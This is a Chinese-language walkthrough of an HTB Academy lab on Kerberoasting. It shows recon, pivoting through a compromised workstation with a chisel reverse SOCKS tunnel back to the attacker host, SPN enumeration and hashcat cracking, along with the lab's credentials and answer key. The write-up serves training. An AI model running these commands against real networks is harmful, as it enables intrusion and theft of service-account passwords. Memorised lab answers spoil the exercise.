# Kerberoasting（透過跳板從 Linux 打）

> HTB Academy / Kerberos Attacks 模組
> 目標：`10.129.57.196`（ACADEMY-KERBATTCK-WS01）— **只是工作站，DC 在內網**
> 授權帳號：`INLANEFREIGHT\htb-student : HTB_@cademy_stdnt!`

Kerberoasting：鎖定「有 `servicePrincipalName` 的服務帳號」。任何已認證的網域使用者都能向 KDC 要該服務的 **TGS-REP**，票券中有一段用該服務帳號的 NTLM hash 加密 → 離線爆破 → 拿到服務帳號明文密碼。

---

## 答案

| 題目 | 答案 |
|---|---|
| q1 名字開頭 "ja" 的 Kerberoastable 帳號 | **`jacob.kelly`**（SPN `SVC/FILER02.inlanefreight.local`） |
| q2 該帳號密碼 | **`tinkerbell`** |

---

## 1. 偵察

```bash
ping -c2 10.129.57.196                     # 通
nmap -Pn -p 88,135,139,389,445,636,3268,3389,5985 -sV --open 10.129.57.196
```
只開 `135,139,445,3389,5985`，**沒有 88/389** → 這台不是 DC，只是加入網域的工作站。

```bash
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!'
# -> (name:WS01) (domain:INLANEFREIGHT.LOCAL)  [+] ... (Pwn3d!)   ← htb-student 是 WS01 本機 admin
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!' -x "nltest /dsgetdc:INLANEFREIGHT.LOCAL"
# -> DC: \\DC01.INLANEFREIGHT.LOCAL   Address: \\172.16.99.3     ← DC 在內網
```

---

## 2. 卡關原因（核心）

```bash
ping -c1 -W2 172.16.99.3                                      # 100% loss
timeout 4 bash -c 'cat </dev/null >/dev/tcp/172.16.99.3/88'  # 88 unreachable
ip route get 172.16.99.3                                      # via tun0，無 172.16 路由
```

DC（`172.16.99.3`）在內網 `172.16.99.0/24`，VPN 只接到 `10.129.x`，**沒有路由**。
直接 `GetUserSPNs.py -dc-ip 172.16.99.3` 一定逾時 —— 不是指令錯，是到不了 KDC。

**正確做法**：`htb-student` 是 WS01 本機 admin，WS01 又是雙網卡（外網 `10.129.57.196` + 內網 `172.16.99.x`）。把 WS01 當跳板，架反向 SOCKS，讓 Linux 的 impacket 轉進內網打 DC。

---

## 3. 建立跳板（chisel 反向 SOCKS）

```bash
# 3.1 下載 Windows chisel 並上傳到 WS01
curl -sL -o c.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip c.gz && mv c chisel.exe
# nxc --put-file 偶發 reset（Error reading from remote(104)），改 smbclient：
smbclient //10.129.57.196/C$ -U 'INLANEFREIGHT.LOCAL\htb-student%HTB_@cademy_stdnt!' \
    -c 'cd \Windows\Temp\; put chisel.exe c.exe'

# 3.2 攻擊機起反向 server（背景跑，別自己再 nohup & 包一層，父行程退出會把它帶走）
chisel server --reverse -p 8008

# 3.3 WS01 連回、開反向 SOCKS（start /b 讓它背景跑，nxc 不卡住）
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!' \
    -x 'start /b "" C:\Windows\Temp\c.exe client 10.10.14.142:8008 R:1080:socks'
# server log: proxy#R:127.0.0.1:1080=>socks: Listening

# 3.4 proxychains 設 socks5，驗證能打到 DC
cat > pc.conf <<'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF
proxychains4 -f pc.conf nxc smb 172.16.99.3 -u htb-student -p 'HTB_@cademy_stdnt!'
# -> DC01 (DC:True)  [+] 認證成功，通道成立
```
> chisel client/server 版本不一致警告（1.10.1 vs 1.13.0）不影響功能，可忽略。

---

## 4. Kerberoasting（隔跳板從 Linux 打）

```bash
# 4.1 列舉有 SPN 的帳號
proxychains4 -f pc.conf GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -dc-ip 172.16.99.3
# ... IIS_dev/...  adam.jones ;  SVC/FILER02.inlanefreight.local  jacob.kelly
# 開頭 ja 的只有 jacob.kelly（adam.jones 的 first name 是 adam）

# 4.2 只要 jacob.kelly 的 TGS hash
proxychains4 -f pc.conf GetUserSPNs.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' \
    -dc-ip 172.16.99.3 -request-user jacob.kelly -outputfile jacob.hash
# 結尾 "CCache file is not found. Skipping..." 只是沒既有票快取，非錯誤

# 4.3 離線爆破（TGS-REP = mode 13100）
hashcat -m 13100 -a 0 jacob.hash /usr/share/wordlists/rockyou.txt -O
# -> ...:tinkerbell
```

---

## 5. 除錯重點

1. target 沒開 88/389 → 它不是 DC，先 `nltest /dsgetdc` 找真正 KDC。
2. 直接打內網 DC 逾時 → 先 `ip route get <ip>` 確認可達性，問題在路由不在指令。
3. 雙網卡的被攻陷主機 = 跳板：chisel 反向 SOCKS + proxychains。
4. 工具小坑：`nxc --put-file` reset 改 `smbclient`；背景跑 chisel 不要自己 `nohup &` 包一層。
5. hash 模式：Kerberoast TGS-REP 用 `-m 13100`；AS-REProast AS-REP 用 `-m 18200`。

---

## 6. 收尾清理

```bash
nxc smb 10.129.57.196 -u htb-student -p 'HTB_@cademy_stdnt!' -x 'taskkill /F /IM c.exe'
smbclient //10.129.57.196/C$ -U 'INLANEFREIGHT.LOCAL\htb-student%HTB_@cademy_stdnt!' -c 'cd \Windows\Temp\; del c.exe'
pkill -f 'chisel server'
```
